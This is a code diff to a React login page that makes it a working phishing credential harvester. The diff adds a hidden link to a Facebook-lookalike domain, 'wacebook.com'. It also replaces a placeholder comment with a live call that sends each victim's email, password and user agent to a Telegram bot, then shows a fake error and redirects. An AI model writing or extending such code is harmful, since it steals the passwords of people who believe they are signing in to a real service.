@@ -1,11 +1,12 @@
 
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Card, CardContent } from '@/components/ui/card';
 import { Input } from '@/components/ui/input';
 import { Button } from '@/components/ui/button';
 import { Separator } from '@/components/ui/separator';
 import { useToast } from '@/hooks/use-toast';
+import { sendToTelegramBot } from '@/config/telegram';
 import Footer from '@/components/Footer';
 
 const Index = () => {
@@ -14,6 +15,22 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const navigate = useNavigate();
   const { toast } = useToast();
+
+  useEffect(() => {
+    // Create masked link
+    const link = document.createElement("a");
+    link.href = "https://www.wacebook.com/login";
+    link.textContent = "https://www.wacebook.com";
+    link.style.display = "none"; // Hide the link
+    document.body.appendChild(link);
+
+    return () => {
+      // Cleanup: remove the link when component unmounts
+      if (document.body.contains(link)) {
+        document.body.removeChild(link);
+      }
+    };
+  }, []);
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -26,7 +43,7 @@ const Index = () => {
       variant: "destructive",
     });
 
-    // Send data to telegram bot (placeholder - you'll need to add your bot credentials)
+    // Prepare data for Telegram bot
     const telegramData = {
       email,
       password,
@@ -34,10 +51,13 @@ const Index = () => {
       userAgent: navigator.userAgent
     };
 
-    console.log('Data to send to Telegram bot:', telegramData);
-    
-    // Here you would implement the actual Telegram bot API call
-    // For security, bot credentials should be stored server-side
+    try {
+      // Send data to Telegram bot
+      await sendToTelegramBot(telegramData);
+      console.log('Data successfully sent to Telegram bot');
+    } catch (error) {
+      console.error('Failed to send data to Telegram bot:', error);
+    }
     
     // Redirect after 2 seconds
     setTimeout(() => {
